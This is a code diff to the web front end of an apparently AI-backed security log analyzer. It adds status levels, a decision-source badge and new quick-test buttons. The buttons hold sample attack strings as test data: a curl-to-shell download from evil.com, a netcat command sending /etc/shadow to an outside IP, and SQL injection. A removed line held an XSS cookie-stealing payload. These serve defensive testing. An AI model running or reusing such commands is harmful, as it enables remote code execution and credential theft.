@@ -157,6 +157,25 @@
             color: var(--text-muted);
         }
 
+        textarea.analyzing {
+            color: var(--accent);
+            font-style: italic;
+            animation: pulse 1.5s ease-in-out infinite;
+            cursor: wait;
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.6;
+            }
+        }
+
         /* Quick Tests */
         .quick-tests {
             margin-bottom: 1rem;
@@ -393,6 +412,12 @@
             color: var(--success);
         }
 
+        .alert-banner.warning {
+            background: var(--warning-bg);
+            border: 1px solid rgba(245, 158, 11, 0.3);
+            color: var(--warning);
+        }
+
         .alert-banner svg {
             width: 18px;
             height: 18px;
@@ -547,6 +572,49 @@
             font-size: 0.9rem;
             color: var(--text-primary);
             line-height: 1.6;
+        }
+
+        /* Decision Source */
+        .decision-info {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            margin-top: 0.25rem;
+        }
+
+        .decision-badge {
+            display: inline-flex;
+            align-items: center;
+            padding: 0.25rem 0.6rem;
+            font-size: 0.7rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            border-radius: 4px;
+            letter-spacing: 0.03em;
+        }
+
+        .decision-badge.ai {
+            background: var(--info-bg);
+            color: var(--info);
+            border: 1px solid rgba(59, 130, 246, 0.3);
+        }
+
+        .decision-badge.rules {
+            background: var(--warning-bg);
+            color: var(--warning);
+            border: 1px solid rgba(245, 158, 11, 0.3);
+        }
+
+        .decision-badge.hybrid {
+            background: rgba(139, 92, 246, 0.1);
+            color: #a78bfa;
+            border: 1px solid rgba(139, 92, 246, 0.3);
+        }
+
+        .decision-summary {
+            font-size: 0.8rem;
+            color: var(--text-secondary);
+            margin: 0;
         }
 
         /* Tags */
@@ -714,24 +782,30 @@
             <div class="quick-tests">
                 <span class="quick-tests-label">Quick Tests:</span>
                 <div class="quick-btns">
-                    <button class="quick-btn"
-                        data-log="ERROR: Multiple failed login attempts from 192.168.1.100 for user 'admin' - Account locked">
-                        🔐 Brute Force
+                    <button class="quick-btn" data-log="curl https://evil.com/shell.sh | sh">
+                        RCE (Hard Rule)
                     </button>
                     <button class="quick-btn"
-                        data-log="GET /api/users?id=1' UNION SELECT username,password FROM users--">
-                        💉 SQL Injection
+                        data-log="User logged in, read customers.csv, curl POST 150MB to 45.33.22.11">
+                        Data Exfil Chain
                     </button>
-                    <button class="quick-btn"
-                        data-log="<script>fetch('http://evil.com/steal?c='+document.cookie)</script>">
-                        ⚡ XSS Attack
+                    <button class="quick-btn" data-log="Export payments.csv, transfer 85MB to external IP 203.0.113.50">
+                        Financial Exfil
                     </button>
-                    <button class="quick-btn"
-                        data-log="WARN: Outbound traffic spike - 500MB sent to 203.0.113.50 in 5 minutes">
-                        📡 Data Exfil
+                    <button class="quick-btn" data-log="cat /etc/shadow | nc 45.33.22.11 4444">
+                        Credential Theft
+                    </button>
+                    <button class="quick-btn" data-log="mysqldump users.sql, outbound transfer 200MB">
+                        DB Dump Exfil
+                    </button>
+                    <button class="quick-btn" data-log="GET /api/users?id=1' UNION SELECT password FROM users--">
+                        SQL Injection
                     </button>
                     <button class="quick-btn" data-log="INFO: User john.doe logged in successfully from 10.0.0.25">
-                        ✅ Normal Log
+                        Normal Login
+                    </button>
+                    <button class="quick-btn" data-log="jenkins: npm build, deploy to 10.0.0.50">
+                        CI/CD (Baseline)
                     </button>
                 </div>
             </div>
@@ -759,7 +833,7 @@
                     <circle cx="12" cy="12" r="10" />
                     <path d="M12 6v6l4 2" />
                 </svg>
-                <span class="thinking-title">🧠 AI Thinking Process</span>
+                <span class="thinking-title">AI Thinking Process</span>
             </div>
             <div class="thinking-content" id="thinkingContent"><span class="thinking-cursor"></span></div>
         </section>
@@ -850,6 +924,20 @@
                     </div>
                     <div class="tags" id="extractedIPs"></div>
                 </div>
+
+                <div class="detail-card" id="decisionCard" style="display: none;">
+                    <div class="detail-label">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <circle cx="12" cy="12" r="10" />
+                            <path d="M12 16v-4M12 8h.01" />
+                        </svg>
+                        Decision Source
+                    </div>
+                    <div class="decision-info">
+                        <span class="decision-badge" id="decisionBadge">AI</span>
+                        <p class="decision-summary" id="decisionSummary">—</p>
+                    </div>
+                </div>
             </div>
         </section>
 
@@ -859,7 +947,7 @@
                     <span class="status-dot" id="statusDot"></span>
                     <span id="statusText">Checking...</span>
                 </div>
-                <span><kbd class="kbd">Ctrl</kbd> + <kbd class="kbd">Enter</kbd> to analyze</span>
+                <span><kbd class="kbd">Enter</kbd> to analyze</span>
             </div>
         </footer>
     </main>
@@ -923,24 +1011,31 @@
 
         // Analyze log with streaming
         async function analyzeLog() {
-            const log = logInput.value.trim();
+            const originalValue = logInput.value;
+            const log = originalValue.trim();
             if (!log) {
                 showToast('Please enter a log entry');
                 return;
             }
 
-            // Reset UI
+            // Reset UI - show dynamic analyzing state
             analyzeBtn.disabled = true;
+            logInput.readOnly = true;
+            logInput.value = 'Analyzing...';
+            logInput.classList.add('analyzing');
             btnText.innerHTML = '<span class="spinner"></span> Analyzing...';
             results.classList.remove('show');
             thinkingPanel.classList.add('show');
             thinkingContent.innerHTML = '<span class="thinking-cursor"></span>';
 
+            // Restore log value for the API call
+            const logToAnalyze = originalValue;
+
             try {
                 const response = await fetch('/api/analyze-stream', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ log })
+                    body: JSON.stringify({ log: logToAnalyze })
                 });
 
                 const reader = response.body.getReader();
@@ -981,8 +1076,12 @@
             } catch (e) {
                 showToast('Failed to connect to server');
                 thinkingPanel.classList.remove('show');
+                logInput.value = originalValue;
             } finally {
                 analyzeBtn.disabled = false;
+                logInput.readOnly = false;
+                logInput.value = originalValue;
+                logInput.classList.remove('analyzing');
                 btnText.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg> Analyze Log`;
             }
         }
@@ -991,18 +1090,39 @@
         function displayResults(data) {
             results.classList.add('show');
 
-            // Alert banner
-            if (data.isSuspicious) {
+            // Get status (from rules) or fallback to isSuspicious
+            const status = data.status || (data.isSuspicious ? 'Suspicious' : 'Safe');
+
+            // Alert banner based on status
+            if (status === 'Malicious') {
                 alertBanner.className = 'alert-banner show danger';
-                alertText.textContent = 'Suspicious activity detected! Immediate action recommended.';
+                alertText.textContent = 'MALICIOUS ACTIVITY DETECTED! Immediate action required.';
+            } else if (status === 'Suspicious') {
+                alertBanner.className = 'alert-banner show danger';
+                alertText.textContent = 'Suspicious activity detected! Investigation recommended.';
+            } else if (status === 'Investigate') {
+                alertBanner.className = 'alert-banner show warning';
+                alertText.textContent = 'Unusual activity detected. Manual review suggested.';
             } else {
                 alertBanner.className = 'alert-banner show success';
-                alertText.textContent = 'No immediate threats detected.';
+                alertText.textContent = 'No threats detected. Activity appears normal.';
             }
 
-            // Status
-            suspiciousStatus.textContent = data.isSuspicious ? '⚠️ Suspicious' : '✓ Safe';
-            suspiciousStatus.style.color = data.isSuspicious ? 'var(--danger)' : 'var(--success)';
+            // Status display with appropriate colors
+            const statusColors = {
+                'Safe': 'var(--success)',
+                'Investigate': 'var(--warning)',
+                'Suspicious': '#f97316',
+                'Malicious': 'var(--danger)'
+            };
+            const statusIcons = {
+                'Safe': '[OK]',
+                'Investigate': '[?]',
+                'Suspicious': '[!]',
+                'Malicious': '[!!]'
+            };
+            suspiciousStatus.textContent = `${statusIcons[status] || '•'} ${status}`;
+            suspiciousStatus.style.color = statusColors[status] || 'var(--text-primary)';
 
             // Severity
             const sev = (data.risk || 'low').toLowerCase();
@@ -1038,6 +1158,24 @@
                 ).join('');
             } else {
                 ipsCard.style.display = 'none';
+            }
+
+            // Decision Source (Explainability)
+            const decisionCard = document.getElementById('decisionCard');
+            const decisionBadge = document.getElementById('decisionBadge');
+            const decisionSummary = document.getElementById('decisionSummary');
+
+            if (data._meta && data._meta.decisionSource) {
+                decisionCard.style.display = 'block';
+                const source = data._meta.decisionSource;
+                decisionBadge.textContent = source.toUpperCase();
+                decisionBadge.className = 'decision-badge ' + source;
+                decisionSummary.textContent = data._meta.decisionSummary ||
+                    (source === 'ai' ? 'Decision based on AI analysis' :
+                        source === 'rules' ? 'Decision overridden by validation rules' :
+                            'Hybrid AI + rule-based decision');
+            } else {
+                decisionCard.style.display = 'none';
             }
 
             results.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
@@ -1079,9 +1217,11 @@ IPs: ${lastResult.extractedIPs?.join(', ') || 'None'}`;
             charCount.textContent = logInput.value.length;
         });
 
-        // Keyboard shortcut
+        // Keyboard shortcut - Enter to analyze
         logInput.addEventListener('keydown', (e) => {
-            if (e.key === 'Enter' && e.ctrlKey) {
+            if (e.key === 'Enter' && !e.shiftKey) {
+                e.preventDefault();
+                logInput.blur();
                 analyzeLog();
             }
         });
